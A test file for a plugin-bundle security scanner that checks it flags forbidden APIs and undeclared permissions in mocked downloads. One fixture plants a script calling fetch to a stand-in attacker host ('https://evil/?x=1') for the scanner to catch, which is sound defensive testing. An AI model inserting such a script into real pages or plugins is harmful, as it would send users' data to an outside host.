import { describe, it, expect, vi, afterEach } from "vitest";
import { zipSync, strToU8 } from "fflate";
import { runChecks } from "../runChecks";
import type { PluginManifest } from "@helios/plugin-sdk";

const manifest = (permissions: string[]): PluginManifest =>
  ({
    format: 1,
    id: "x.y",
    name: "X",
    version: "1.0.0",
    entry: "dist/index.html",
    sdk: "^1.0.0",
    permissions,
  }) as unknown as PluginManifest;

function mockFetchZip(files: Record<string, string>) {
  const entries: Record<string, Uint8Array> = {};
  for (const [k, v] of Object.entries(files)) entries[k] = strToU8(v);
  const zipped = zipSync(entries);
  global.fetch = vi.fn(async () => ({
    ok: true,
    status: 200,
    arrayBuffer: async () => zipped.buffer,
  })) as unknown as typeof fetch;
}

afterEach(() => {
  vi.restoreAllMocks();
});

describe("runChecks", () => {
  it("downloads, unzips, and flags forbidden APIs", async () => {
    mockFetchZip({
      "manifest.json": '{"id":"x.y"}',
      "dist/index.html": "<script>fetch('https://evil/?x=1')</script>",
    });
    const rep = await runChecks("https://signed/bundle", manifest([]), "2026-06-26T00:00:00Z");
    expect(rep.ranAt).toBe("2026-06-26T00:00:00Z");
    expect(rep.fileCount).toBe(1); // only the .html is scannable (manifest.json is skipped)
    expect(rep.errorCount).toBeGreaterThan(0);
    expect(rep.findings.some((f) => /fetch/.test(f.message))).toBe(true);
  });

  it("reports no errors for a clean, matched bundle", async () => {
    mockFetchZip({ "dist/app.js": "storage.get('k')" });
    const rep = await runChecks("https://signed/bundle", manifest(["storage"]), "t");
    expect(rep.errorCount).toBe(0);
  });

  it("flags an undeclared capability used in the bundle", async () => {
    mockFetchZip({ "dist/app.js": "save(bytes, 'r.csv')" });
    const rep = await runChecks("https://signed/bundle", manifest([]), "t");
    expect(rep.findings.some((f) => f.kind === "undeclared-permission" && f.permission === "file.write")).toBe(true);
  });

  it("throws on a failed download", async () => {
    global.fetch = vi.fn(async () => ({ ok: false, status: 404 })) as unknown as typeof fetch;
    await expect(runChecks("https://signed/bundle", manifest([]))).rejects.toThrow(/HTTP 404/);
  });
});
